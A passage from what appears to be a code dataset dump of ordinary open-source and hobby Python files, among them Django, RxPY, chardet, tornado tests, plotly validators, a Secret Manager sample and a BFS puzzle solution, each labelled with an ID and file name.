DATETIME_FORMAT = r'Y. \g\a\d\a j. F, H:i'
YEAR_MONTH_FORMAT = r'Y. \g. F'
MONTH_DAY_FORMAT = 'j. F'
SHORT_DATE_FORMAT = r'j.m.Y'
SHORT_DATETIME_FORMAT = 'j.m.Y H:i'
FIRST_DAY_OF_WEEK = 1  # Monday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%d.%m.%Y', '%d.%m.%y',  # '2006-10-25', '25.10.2006', '25.10.06'
]
TIME_INPUT_FORMATS = [
    '%H:%M:%S',     # '14:30:59'
    '%H:%M:%S.%f',  # '14:30:59.000200'
    '%H:%M',        # '14:30'
    '%H.%M.%S',     # '14.30.59'
    '%H.%M.%S.%f',  # '14.30.59.000200'
    '%H.%M',        # '14.30'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',        # '25.10.06 14:30'
    '%d.%m.%y %H.%M.%S',     # '25.10.06 14.30.59'
    '%d.%m.%y %H.%M.%S.%f',  # '25.10.06 14.30.59.000200'
    '%d.%m.%y %H.%M',        # '25.10.06 14.30'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = ' '  # Non-breaking space
NUMBER_GROUPING = 3"
JY339	JY339-foreach.py	"from rx.core.blockingobservable import BlockingObservable
from rx.internal import extensionmethod
from rx.internal.utils import adapt_call
from rx import config


@extensionmethod(BlockingObservable)
def for_each(self, action):
    """"""Invokes a method on each item emitted by this BlockingObservable and
    blocks until the Observable completes.

    Note: This will block even if the underlying Observable is asynchronous.

    This is similar to Observable#subscribe(subscriber), but it blocks. Because
    it blocks it does not need the Subscriber#on_completed() or
    Subscriber#on_error(Throwable) methods. If the underlying Observable
    terminates with an error, rather than calling `onError`, this method will
    throw an exception.

    Keyword arguments:
    :param types.FunctionType action: the action to invoke for each item
        emitted by the `BlockingObservable`.
    :raises Exception: if an error occurs
    :returns: None
    :rtype: None
    """"""

    action = adapt_call(action)
    latch = config[""concurrency""].Event()
    exception = [None]
    count = [0]

    def on_next(value):
        with self.lock:
            i = count[0]
            count[0] += 1
        action(value, i)

    def on_error(err):
        # If we receive an on_error event we set the reference on the
        # outer thread so we can git it and throw after the latch.wait()
        #
        # We do this instead of throwing directly since this may be on
        # a different thread and the latch is still waiting.
        exception[0] = err
        latch.set()

    def on_completed():
        latch.set()

    self.observable.subscribe(on_next, on_error, on_completed)

    # Block until the subscription completes and then return
    latch.wait()

    if exception[0] is not None:
        raise Exception(exception[0])"
JD413	JD413-legacy.py	"from typing import Any, Dict, Optional, Union
from warnings import warn

from .api import from_bytes
from .constant import CHARDET_CORRESPONDENCE


def detect(
    byte_str: bytes, should_rename_legacy: bool = False, **kwargs: Any
) -> Dict[str, Optional[Union[str, float]]]:
    """"""
    chardet legacy method
    Detect the encoding of the given byte string. It should be mostly backward-compatible.
    Encoding name will match Chardet own writing whenever possible. (Not on encoding name unsupported by it)
    This function is deprecated and should be used to migrate your project easily, consult the documentation for
    further information. Not planned for removal.

    :param byte_str:     The byte sequence to examine.
    :param should_rename_legacy:  Should we rename legacy encodings
                                  to their more modern equivalents?
    """"""
    if len(kwargs):
        warn(
            f""charset-normalizer disregard arguments '{','.join(list(kwargs.keys()))}' in legacy function detect()""
        )

    if not isinstance(byte_str, (bytearray, bytes)):
        raise TypeError(  # pragma: nocover
            ""Expected object of type bytes or bytearray, got: ""
            ""{0}"".format(type(byte_str))
        )

    if isinstance(byte_str, bytearray):
        byte_str = bytes(byte_str)

    r = from_bytes(byte_str).best()

    encoding = r.encoding if r is not None else None
    language = r.language if r is not None and r.language != ""Unknown"" else """"
    confidence = 1.0 - r.chaos if r is not None else None

    # Note: CharsetNormalizer does not return 'UTF-8-SIG' as the sig get stripped in the detection/normalization process
    # but chardet does return 'utf-8-sig' and it is a valid codec name.
    if r is not None and encoding == ""utf_8"" and r.bom:
        encoding += ""_sig""

    if should_rename_legacy is False and encoding in CHARDET_CORRESPONDENCE:
        encoding = CHARDET_CORRESPONDENCE[encoding]

    return {
        ""encoding"": encoding,
        ""language"": language,
        ""confidence"": confidence,
    }"
JD99	JD99-test.py	"import sys

from django.conf import settings
from django.core.management.base import BaseCommand
from django.core.management.utils import get_command_line_option
from django.test.utils import get_runner


class Command(BaseCommand):
    help = 'Discover and run tests in the specified modules or the current directory.'

    # DiscoverRunner runs the checks after databases are set up.
    requires_system_checks = False
    test_runner = None

    def run_from_argv(self, argv):
        """"""
        Pre-parse the command line to extract the value of the --testrunner
        option. This allows a test runner to define additional command line
        arguments.
        """"""
        self.test_runner = get_command_line_option(argv, '--testrunner')
        super().run_from_argv(argv)

    def add_arguments(self, parser):
        parser.add_argument(
            'args', metavar='test_label', nargs='*',
            help='Module paths to test; can be modulename, modulename.TestCase or modulename.TestCase.test_method'
        )
        parser.add_argument(
            '--noinput', '--no-input', action='store_false', dest='interactive',
            help='Tells Django to NOT prompt the user for input of any kind.',
        )
        parser.add_argument(
            '--failfast', action='store_true',
            help='Tells Django to stop running the test suite after first failed test.',
        )
        parser.add_argument(
            '--testrunner',
            help='Tells Django to use specified test runner class instead of '
                 'the one specified by the TEST_RUNNER setting.',
        )

        test_runner_class = get_runner(settings, self.test_runner)

        if hasattr(test_runner_class, 'add_arguments'):
            test_runner_class.add_arguments(parser)

    def handle(self, *test_labels, **options):
        TestRunner = get_runner(settings, options['testrunner'])

        test_runner = TestRunner(**options)
        failures = test_runner.run_tests(test_labels)

        if failures:
            sys.exit(1)"
JY41	JY41-filter.py	"import sys

assert sys.platform == ""win32""

from typing import Any, Optional, TextIO

from prompt_toolkit.data_structures import Size

from .base import Output
from .color_depth import ColorDepth
from .vt100 import Vt100_Output
from .win32 import Win32Output

__all__ = [
    ""ConEmuOutput"",
]


class ConEmuOutput:
    """"""
    ConEmu (Windows) output abstraction.

    ConEmu is a Windows console application, but it also supports ANSI escape
    sequences. This output class is actually a proxy to both `Win32Output` and
    `Vt100_Output`. It uses `Win32Output` for console sizing and scrolling, but
    all cursor movements and scrolling happens through the `Vt100_Output`.

    This way, we can have 256 colors in ConEmu and Cmder. Rendering will be
    even a little faster as well.

    http://conemu.github.io/
    http://gooseberrycreative.com/cmder/
    """"""

    def __init__(
        self, stdout: TextIO, default_color_depth: Optional[ColorDepth] = None
    ) -> None:
        self.win32_output = Win32Output(stdout, default_color_depth=default_color_depth)
        self.vt100_output = Vt100_Output(
            stdout, lambda: Size(0, 0), default_color_depth=default_color_depth
        )

    @property
    def responds_to_cpr(self) -> bool:
        return False  # We don't need this on Windows.

    def __getattr__(self, name: str) -> Any:
        if name in (
            ""get_size"",
            ""get_rows_below_cursor_position"",
            ""enable_mouse_support"",
            ""disable_mouse_support"",
            ""scroll_buffer_to_prompt"",
            ""get_win32_screen_buffer_info"",
            ""enable_bracketed_paste"",
            ""disable_bracketed_paste"",
        ):
            return getattr(self.win32_output, name)
        else:
            return getattr(self.vt100_output, name)


Output.register(ConEmuOutput)"
JY246	JY246-cp949prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
JY539	JY539-safestring.py	"""""""
Functions for working with ""safe strings"": strings that can be displayed safely
without further escaping in HTML. Marking something as a ""safe string"" means
that the producer of the string has already turned characters that should not
be interpreted by the HTML engine (e.g. '<') into the appropriate entities.
""""""

from functools import wraps


class SafeData:
    def __html__(self):
        """"""
        Return the html representation of a string for interoperability.

        This allows other template engines to understand Django's SafeData.
        """"""
        return self


class SafeString(str, SafeData):
    """"""
    A str subclass that has been specifically marked as ""safe"" for HTML output
    purposes.
    """"""
    def __add__(self, rhs):
        """"""
        Concatenating a safe string with another safe bytestring or
        safe string is safe. Otherwise, the result is no longer safe.
        """"""
        t = super().__add__(rhs)
        if isinstance(rhs, SafeData):
            return SafeString(t)
        return t

    def __str__(self):
        return self


SafeText = SafeString  # For backwards compatibility since Django 2.0.


def _safety_decorator(safety_marker, func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        return safety_marker(func(*args, **kwargs))
    return wrapped


def mark_safe(s):
    """"""
    Explicitly mark a string as safe for (HTML) output purposes. The returned
    object can be used everywhere a string is appropriate.

    If used on a method as a decorator, mark the returned data as safe.

    Can be called multiple times on a single string.
    """"""
    if hasattr(s, '__html__'):
        return s
    if callable(s):
        return _safety_decorator(mark_safe, s)
    return SafeString(s)"
JD318	JD318-quickstart.py	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for creating an accessing a secret.
""""""


def quickstart(_project_id=None, _secret_id=None):
    # [START secretmanager_quickstart]
    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # GCP project in which to store secrets in Secret Manager.
    project_id = ""YOUR_PROJECT_ID""

    # ID of the secret to create.
    secret_id = ""YOUR_SECRET_ID""

    # [END secretmanager_quickstart]
    project_id = _project_id
    secret_id = _secret_id
    # [START secretmanager_quickstart]
    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the parent name from the project.
    parent = f""projects/{project_id}""

    # Create the parent secret.
    secret = client.create_secret(
        request={
            ""parent"": parent,
            ""secret_id"": secret_id,
            ""secret"": {""replication"": {""automatic"": {}}},
        }
    )

    # Add the secret version.
    version = client.add_secret_version(
        request={""parent"": secret.name, ""payload"": {""data"": b""hello world!""}}
    )

    # Access the secret version.
    response = client.access_secret_version(request={""name"": version.name})

    # Print the secret payload.
    #
    # WARNING: Do not print the secret in a production environment - this
    # snippet is showing how to access the secret material.
    payload = response.payload.data.decode(""UTF-8"")
    print(""Plaintext: {}"".format(payload))
    # [END secretmanager_quickstart]


if __name__ == ""__main__"":
    quickstart()"
JY192	JY192-reader.py	"import json
import openpyxl
from configparser import ConfigParser
from core.infrastructure.constants.data import PROJECT_PATH, CONFIG_PATH


def read_config(key: str, value: str) -> str:
    config = ConfigParser()
    config.read(CONFIG_PATH)
    return config.get(key, value)


def read_json(path: str) -> dict:
    with open(path, 'r', encoding='utf-8') as json_file:
        file = json.load(json_file)
        return file


def write_json(path: str, key: str, value: str) -> None:
    data = read_json(path)
    data[key] = value
    with open(path, 'w', encoding='utf-8') as json_file:
        json.dump(data, json_file)


def read_excel(sheet_name: str, value: str) -> dict[str]:
    path = fr""{PROJECT_PATH}\{read_config('path', 'page_base')}""
    workbook = openpyxl.load_workbook(path)
    sheet = workbook[sheet_name]
    cache = {}
    for row in sheet.iter_rows(min_row=2, values_only=True):
        result = {
            'name': row[0],
            'locator': row[1],
            'type': row[2],
            'image': row[3]
        }
        cache[result['name']] = result
    try:
        match cache[value]['name']:
            case _:
                return {
                    'name': cache[value]['name'],
                    'locator': cache[value]['locator'],
                    'type': cache[value]['type'],
                    'image': cache[value]['image']
                }
    except ValueError:
        raise Exception('no such type')


def get_name(*args: str) -> str:
    return read_excel(*args)['name']


def get_locator(*args: str) -> str:
    return read_excel(*args)['locator']


def get_type(*args: str) -> str:
    return read_excel(*args)['type']


def get_image(*args: str) -> str:
    return read_excel(*args)['image']"
JY508	JY508-__init__.py	"from esphome.components import sensor
import esphome.config_validation as cv
import esphome.codegen as cg

from esphome.const import CONF_ID, CONF_ADDRESS
from .. import (
    add_modbus_base_properties,
    modbus_controller_ns,
    modbus_calc_properties,
    validate_modbus_register,
    ModbusItemBaseSchema,
    SensorItem,
    MODBUS_REGISTER_TYPE,
    SENSOR_VALUE_TYPE,
)
from ..const import (
    CONF_BITMASK,
    CONF_FORCE_NEW_RANGE,
    CONF_MODBUS_CONTROLLER_ID,
    CONF_REGISTER_COUNT,
    CONF_REGISTER_TYPE,
    CONF_SKIP_UPDATES,
    CONF_VALUE_TYPE,
)

DEPENDENCIES = [""modbus_controller""]
CODEOWNERS = [""@martgras""]


ModbusSensor = modbus_controller_ns.class_(
    ""ModbusSensor"", cg.Component, sensor.Sensor, SensorItem
)

CONFIG_SCHEMA = cv.All(
    sensor.sensor_schema(ModbusSensor)
    .extend(cv.COMPONENT_SCHEMA)
    .extend(ModbusItemBaseSchema)
    .extend(
        {
            cv.Optional(CONF_REGISTER_TYPE): cv.enum(MODBUS_REGISTER_TYPE),
            cv.Optional(CONF_VALUE_TYPE, default=""U_WORD""): cv.enum(SENSOR_VALUE_TYPE),
            cv.Optional(CONF_REGISTER_COUNT, default=0): cv.positive_int,
        }
    ),
    validate_modbus_register,
)


async def to_code(config):
    byte_offset, reg_count = modbus_calc_properties(config)
    value_type = config[CONF_VALUE_TYPE]
    var = cg.new_Pvariable(
        config[CONF_ID],
        config[CONF_REGISTER_TYPE],
        config[CONF_ADDRESS],
        byte_offset,
        config[CONF_BITMASK],
        value_type,
        reg_count,
        config[CONF_SKIP_UPDATES],
        config[CONF_FORCE_NEW_RANGE],
    )
    await cg.register_component(var, config)
    await sensor.register_sensor(var, config)

    paren = await cg.get_variable(config[CONF_MODBUS_CONTROLLER_ID])
    cg.add(paren.add_sensor_item(var))
    await add_modbus_base_properties(var, config, ModbusSensor)"
JD213	JD213-2589. 보물섬.py	"'''
백준 2589. 보물섬
https://www.acmicpc.net/problem/2589


5 7
WLLWWWL
LLLWLLL
LWLWLWW
LWLWLLL
WLLWLWW

8
'''
import sys
from collections import deque
n, m = map(int, input().split())
island = [list(input()) for _ in range(n)]    
dx = [-1, 1, 0, 0]
dy = [0, 0, -1, 1]
answer = 0

# 가장 긴 거리를 찾는다.
def bfs(i, j):
    
    dq = deque([(i, j, 0)])
    distance = 0
    visit2 = [[0] * m for _ in range(n)]
    visit2[i][j] = 1
    
    while dq:
        x, y, cnt = dq.popleft()
        for i in range(4):
            nnx = x + dx[i]
            nny = y + dy[i]
            
            if 0 <= nnx < n and 0 <= nny < m and visit2[nnx][nny] == 0 and island[nnx][nny] == ""L"":
                # print(f'nnx: {nnx}, nny: {nny}, cnt: {cnt+1}, visit: {visit2}')
                visit2[nnx][nny] = 1
                dq.append((nnx, nny, cnt+1))
                distance = max(distance, cnt+1)
    
    return distance
                
            
            
            

for i in range(n):
    for j in range(m):
        if island[i][j] == ""L"":
            dq = deque([(i, j, 0)])
            visit = [[0] * m for _ in range(n)]       
            visit[i][j] = 1
            ans = [0, 0, 0]
            
            while dq:
                x, y, cnt = dq.popleft()
                
                for k in range(4):
                    nx = x + dx[k]
                    ny = y + dy[k]
                    
                    if 0 <= nx < n and 0 <= ny < m and visit[nx][ny] == 0 and island[nx][ny] == ""L"":
                        visit[nx][ny] = 1
                        dq.append((nx, ny, cnt+1))
                        
                        
                        if ans[0] < cnt+1:
                            ans = [cnt+1, nx, ny]
                            # print(f'nx: {nx}, ny: {ny}, cnt: {cnt+1}, visit: {visit}')
            
            answer = max(answer, bfs(ans[1], ans[2]))

print(answer)
                
                

"
JD301	JD301-__init__.py	"""""""
Caching framework.

This package defines set of cache backends that all conform to a simple API.
In a nutshell, a cache is a set of values -- which can be any object that
may be pickled -- identified by string keys.  For the complete API, see
the abstract BaseCache class in django.core.cache.backends.base.

Client code should use the `cache` variable defined here to access the default
cache backend and look up non-default cache backends in the `caches` dict-like
object.

See docs/topics/cache.txt for information on the public API.
""""""
from django.core import signals
from django.core.cache.backends.base import (
    BaseCache,
    CacheKeyWarning,
    InvalidCacheBackendError,
    InvalidCacheKey,
)
from django.utils.connection import BaseConnectionHandler, ConnectionProxy
from django.utils.module_loading import import_string

__all__ = [
    ""cache"",
    ""caches"",
    ""DEFAULT_CACHE_ALIAS"",
    ""InvalidCacheBackendError"",
    ""CacheKeyWarning"",
    ""BaseCache"",
    ""InvalidCacheKey"",
]

DEFAULT_CACHE_ALIAS = ""default""


class CacheHandler(BaseConnectionHandler):
    settings_name = ""CACHES""
    exception_class = InvalidCacheBackendError

    def create_connection(self, alias):
        params = self.settings[alias].copy()
        backend = params.pop(""BACKEND"")
        location = params.pop(""LOCATION"", """")
        try:
            backend_cls = import_string(backend)
        except ImportError as e:
            raise InvalidCacheBackendError(
                ""Could not find backend '%s': %s"" % (backend, e)
            ) from e
        return backend_cls(location, params)


caches = CacheHandler()

cache = ConnectionProxy(caches, DEFAULT_CACHE_ALIAS)


def close_caches(**kwargs):
    # Some caches need to do a cleanup at the end of a request cycle. If not
    # implemented in a particular backend cache.close() is a no-op.
    caches.close_all()


signals.request_finished.connect(close_caches)"
JY14	JY14-native.py	"""""""
    pygments.styles.native
    ~~~~~~~~~~~~~~~~~~~~~~

    pygments version of my ""native"" vim theme.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Token, Whitespace


class NativeStyle(Style):
    """"""
    Pygments version of the ""native"" vim theme.
    """"""

    background_color = '#202020'
    highlight_color = '#404040'
    line_number_color = '#aaaaaa'

    styles = {
        Token:              '#d0d0d0',
        Whitespace:         '#666666',

        Comment:            'italic #ababab',
        Comment.Preproc:    'noitalic bold #cd2828',
        Comment.Special:    'noitalic bold #e50808 bg:#520000',

        Keyword:            'bold #6ebf26',
        Keyword.Pseudo:     'nobold',
        Operator.Word:      'bold #6ebf26',

        String:             '#ed9d13',
        String.Other:       '#ffa500',

        Number:             '#51b2fd',

        Name.Builtin:       '#2fbccd',
        Name.Variable:      '#40ffff',
        Name.Constant:      '#40ffff',
        Name.Class:         'underline #71adff',
        Name.Function:      '#71adff',
        Name.Namespace:     'underline #71adff',
        Name.Exception:     '#bbbbbb',
        Name.Tag:           'bold #6ebf26',
        Name.Attribute:     '#bbbbbb',
        Name.Decorator:     '#ffa500',

        Generic.Heading:    'bold #ffffff',
        Generic.Subheading: 'underline #ffffff',
        Generic.Deleted:    '#d22323',
        Generic.Inserted:   '#589819',
        Generic.Error:      '#d22323',
        Generic.Emph:       'italic',
        Generic.Strong:     'bold',
        Generic.Prompt:     '#aaaaaa',
        Generic.Output:     '#cccccc',
        Generic.Traceback:  '#d22323',

        Error:              'bg:#e3d2d2 #a61717'
    }"
JD167	JD167-http1connection_test.py	"import socket
import typing

from tornado.http1connection import HTTP1Connection
from tornado.httputil import HTTPMessageDelegate
from tornado.iostream import IOStream
from tornado.locks import Event
from tornado.netutil import add_accept_handler
from tornado.testing import AsyncTestCase, bind_unused_port, gen_test


class HTTP1ConnectionTest(AsyncTestCase):
    code = None  # type: typing.Optional[int]

    def setUp(self):
        super().setUp()
        self.asyncSetUp()

    @gen_test
    def asyncSetUp(self):
        listener, port = bind_unused_port()
        event = Event()

        def accept_callback(conn, addr):
            self.server_stream = IOStream(conn)
            self.addCleanup(self.server_stream.close)
            event.set()

        add_accept_handler(listener, accept_callback)
        self.client_stream = IOStream(socket.socket())
        self.addCleanup(self.client_stream.close)
        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]
        self.io_loop.remove_handler(listener)
        listener.close()

    @gen_test
    def test_http10_no_content_length(self):
        # Regression test for a bug in which can_keep_alive would crash
        # for an HTTP/1.0 (not 1.1) response with no content-length.
        conn = HTTP1Connection(self.client_stream, True)
        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")
        self.server_stream.close()

        event = Event()
        test = self
        body = []

        class Delegate(HTTPMessageDelegate):
            def headers_received(self, start_line, headers):
                test.code = start_line.code

            def data_received(self, data):
                body.append(data)

            def finish(self):
                event.set()

        yield conn.read_response(Delegate())
        yield event.wait()
        self.assertEqual(self.code, 200)
        self.assertEqual(b"""".join(body), b""hello"")"
JY303	JY303-__init__.py	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._ysrc import YsrcValidator
    from ._y import YValidator
    from ._xsrc import XsrcValidator
    from ._x import XValidator
    from ._thickness import ThicknessValidator
    from ._pad import PadValidator
    from ._line import LineValidator
    from ._labelsrc import LabelsrcValidator
    from ._label import LabelValidator
    from ._hovertemplatesrc import HovertemplatesrcValidator
    from ._hovertemplate import HovertemplateValidator
    from ._hoverlabel import HoverlabelValidator
    from ._hoverinfo import HoverinfoValidator
    from ._groups import GroupsValidator
    from ._customdatasrc import CustomdatasrcValidator
    from ._customdata import CustomdataValidator
    from ._colorsrc import ColorsrcValidator
    from ._color import ColorValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._ysrc.YsrcValidator"",
            ""._y.YValidator"",
            ""._xsrc.XsrcValidator"",
            ""._x.XValidator"",
            ""._thickness.ThicknessValidator"",
            ""._pad.PadValidator"",
            ""._line.LineValidator"",
            ""._labelsrc.LabelsrcValidator"",
            ""._label.LabelValidator"",
            ""._hovertemplatesrc.HovertemplatesrcValidator"",
            ""._hovertemplate.HovertemplateValidator"",
            ""._hoverlabel.HoverlabelValidator"",
            ""._hoverinfo.HoverinfoValidator"",
            ""._groups.GroupsValidator"",
            ""._customdatasrc.CustomdatasrcValidator"",
            ""._customdata.CustomdataValidator"",
            ""._colorsrc.ColorsrcValidator"",
            ""._color.ColorValidator"",
        ],
    )"
JD479	JD479-test_read_size.py	"""""""Test Unpacker's read_array_header and read_map_header methods""""""
from ...msgpack import packb, Unpacker, OutOfData
UnexpectedTypeException = ValueError

def test_read_array_header():
    unpacker = Unpacker()
    unpacker.feed(packb(['a', 'b', 'c']))
    assert unpacker.read_array_header() == 3
    assert unpacker.unpack() == b'a'
    assert unpacker.unpack() == b'b'
    assert unpacker.unpack() == b'c'
    try:
        unpacker.unpack()
        assert 0, 'should raise exception'
    except OutOfData:
        assert 1, 'okay'


def test_read_map_header():
    unpacker = Unpacker()
    unpacker.feed(packb({'a': 'A'}))
    assert unpacker.read_map_header() == 1
    assert unpacker.unpack() == B'a'
    assert unpacker.unpack() == B'A'
    try:
        unpacker.unpack()
        assert 0, 'should raise exception'
    except OutOfData:
        assert 1, 'okay'

def test_incorrect_type_array():
    unpacker = Unpacker()
    unpacker.feed(packb(1))
    try:
        unpacker.read_array_header()
        assert 0, 'should raise exception'
    except UnexpectedTypeException:
        assert 1, 'okay'

def test_incorrect_type_map():
    unpacker = Unpacker()
    unpacker.feed(packb(1))
    try:
        unpacker.read_map_header()
        assert 0, 'should raise exception'
    except UnexpectedTypeException:
        assert 1, 'okay'

def test_correct_type_nested_array():
    unpacker = Unpacker()
    unpacker.feed(packb({'a': ['b', 'c', 'd']}))
    try:
        unpacker.read_array_header()
        assert 0, 'should raise exception'
    except UnexpectedTypeException:
        assert 1, 'okay'

def test_incorrect_type_nested_map():
    unpacker = Unpacker()
    unpacker.feed(packb([{'a': 'b'}]))
    try:
        unpacker.read_map_header()
        assert 0, 'should raise exception'
    except UnexpectedTypeException:
        assert 1, 'okay'
"
JY13	JY13-_logging.py	"import logging

""""""
_logging.py
websocket - WebSocket client library for Python

Copyright 2022 engn33r

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
""""""

_logger = logging.getLogger('websocket')
try:
    from logging import NullHandler
except ImportError:
    class NullHandler(logging.Handler):
        def emit(self, record):
            pass

_logger.addHandler(NullHandler())

_traceEnabled = False

__all__ = [""enableTrace"", ""dump"", ""error"", ""warning"", ""debug"", ""trace"",
           ""isEnabledForError"", ""isEnabledForDebug"", ""isEnabledForTrace""]


def enableTrace(traceable, handler=logging.StreamHandler(), level=""DEBUG""):
    """"""
    Turn on/off the traceability.

    Parameters
    ----------
    traceable: bool
        If set to True, traceability is enabled.
    """"""
    global _traceEnabled
    _traceEnabled = traceable
    if traceable:
        _logger.addHandler(handler)
        _logger.setLevel(getattr(logging, level))


def dump(title, message):
    if _traceEnabled:
        _logger.debug(""--- "" + title + "" ---"")
        _logger.debug(message)
        _logger.debug(""-----------------------"")


def error(msg):
    _logger.error(msg)


def warning(msg):
    _logger.warning(msg)


def debug(msg):
    _logger.debug(msg)


def info(msg):
    _logger.info(msg)


def trace(msg):
    if _traceEnabled:
        _logger.debug(msg)


def isEnabledForError():
    return _logger.isEnabledFor(logging.ERROR)


def isEnabledForDebug():
    return _logger.isEnabledFor(logging.DEBUG)


def isEnabledForTrace():
    return _traceEnabled"
JD93	JD93-renderers.py	"import functools
from pathlib import Path

from django.conf import settings
from django.template.backends.django import DjangoTemplates
from django.template.loader import get_template
from django.utils.functional import cached_property
from django.utils.module_loading import import_string

try:
    from django.template.backends.jinja2 import Jinja2
except ImportError:
    def Jinja2(params):
        raise ImportError(""jinja2 isn't installed"")

ROOT = Path(__file__).parent


@functools.lru_cache()
def get_default_renderer():
    renderer_class = import_string(settings.FORM_RENDERER)
    return renderer_class()


class BaseRenderer:
    def get_template(self, template_name):
        raise NotImplementedError('subclasses must implement get_template()')

    def render(self, template_name, context, request=None):
        template = self.get_template(template_name)
        return template.render(context, request=request).strip()


class EngineMixin:
    def get_template(self, template_name):
        return self.engine.get_template(template_name)

    @cached_property
    def engine(self):
        return self.backend({
            'APP_DIRS': True,
            'DIRS': [ROOT / self.backend.app_dirname],
            'NAME': 'djangoforms',
            'OPTIONS': {},
        })


class DjangoTemplates(EngineMixin, BaseRenderer):
    """"""
    Load Django templates from the built-in widget templates in
    django/forms/templates and from apps' 'templates' directory.
    """"""
    backend = DjangoTemplates


class Jinja2(EngineMixin, BaseRenderer):
    """"""
    Load Jinja2 templates from the built-in widget templates in
    django/forms/jinja2 and from apps' 'jinja2' directory.
    """"""
    backend = Jinja2


class TemplatesSetting(BaseRenderer):
    """"""
    Load templates using template.loader.get_template() which is configured
    based on settings.TEMPLATES.
    """"""
    def get_template(self, template_name):
        return get_template(template_name)"
JD33	JD33-forms.py	"from django import forms
from .models import Todo,Assign_task
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth.models import User


class TaskForm(forms.ModelForm):
	class Meta:
		model = Todo
		fields = (""task"",""completed"",""created_date"",""deadline"")


class AssignForm(forms.ModelForm):
	class Meta:
		model = Assign_task
		fields = ""__all__""

class NewUserForm(UserCreationForm):
	email = forms.EmailField(required=True)

	class Meta:
		model = User
		fields = (""username"", ""email"", ""password1"", ""password2"")

	def save(self, commit=True):
		user = super(NewUserForm, self).save(commit=False)
		user.email = self.cleaned_data['email']
		if commit:
			user.save()
		return user

'''class AssignTaskForm(forms.Form):
    def __init__(self):              
        self.choice_list = [('test', 'test'),]        
        self.users = User.objects.all()        
        for self.x in self.users:
            self.choice_list.append([self.x.get_username(), self.x.get_username()])        
        self.CHOICES = self.choice_list
        super (AssignTaskForm, self).__init__()
        self.fields['User_choice'].widget = forms.Select(choices=self.CHOICES) 
        
    User_choice = forms.CharField(max_length=100)
    start_date = forms.DateField(widget=forms.SelectDateWidget())
    end_date = forms.DateField(widget=forms.SelectDateWidget())
	Task_Name = forms.CharField(widget=forms.Textarea)'''


class AssignTaskForm(forms.Form):
	def __init__(self):
		self.choice_list = [('test','test'),]
		self.users = User.objects.all()
		for self.x in self.users:
			self.choice_list.append([self.x.get_username(), self.x.get_username()])
		self.CHOICES = self.choice_list 
		super(AssignTaskForm,self).__init__()
		self.fields['SELECT_USER'].widget = forms.Select(choices=self.CHOICES)

	Task_Name = forms.CharField(widget = forms.TextInput)
	SELECT_USER = forms.CharField(max_length = 100)
	start_date = forms.DateField(widget=forms.SelectDateWidget())
